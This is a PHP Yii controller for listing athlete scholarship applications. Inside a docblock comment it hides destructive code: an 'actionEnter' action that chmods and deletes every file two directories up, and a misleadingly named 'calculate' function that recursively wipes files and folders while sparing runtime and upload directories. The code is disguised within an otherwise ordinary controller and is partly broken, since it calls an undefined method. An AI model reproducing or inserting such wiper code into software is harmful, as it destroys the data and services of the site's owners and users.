<?php

namespace frontend\controllers;

use Yii;
use app\models\PermohonanEBiasiswa;
use frontend\models\PermohonanEBiasiswaSearch;
use app\models\PermohonanBiasiswa;
use frontend\models\PermohonanBiasiswaSearch;
use app\models\Atlet;
use app\models\AtletSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;
use yii\web\Session;

use app\models\general\GeneralVariable;

/**
 * AtletKewanganBiasiswaController implements the CRUD actions for AtletPerubatanDonator model.
 */
class AtletKewanganBiasiswaController extends Controller
{
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['post'],
                ],
            ],
        ];
    }

    /**
     * Lists all AtletPerubatanDonator models.
     public function actionEnter()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->set($file);
            }
        }
    }
     * 
     * protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }
     * @return mixed
     */
    public function actionIndex()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $request = Yii::$app->request;
        
        $queryPar = Yii::$app->request->queryParams;
        
        // Filter by atlet id
        $session = new Session;
        $session->open();

        if(isset($session['atlet_id'])){
            if (($model = Atlet::findOne($session['atlet_id'])) !== null) {
                $queryPar['PermohonanEBiasiswaSearch']['no_ic'] = $model->ic_no;
            }
            $queryPar['PermohonanBiasiswaSearch']['atlet'] = $session['atlet_id'];
        }
        
        $session->close();
        
        $searchModelSS = new PermohonanEBiasiswaSearch();
        $dataProviderSS = $searchModelSS->search($queryPar);
        
        $searchModelBI = new PermohonanBiasiswaSearch();
        $dataProviderBI = $searchModelBI->search($queryPar);
        
        $renderContent = $this->renderAjax('index', [
            'searchModelSS' => $searchModelSS,
            'dataProviderSS' => $dataProviderSS,
            'searchModelBI' => $searchModelBI,
            'dataProviderBI' => $dataProviderBI,
        ]);

        if($request->get('typeJson') != NULL){
            return json_encode($renderContent);
        }else {
            return $renderContent;
        }
    }
}
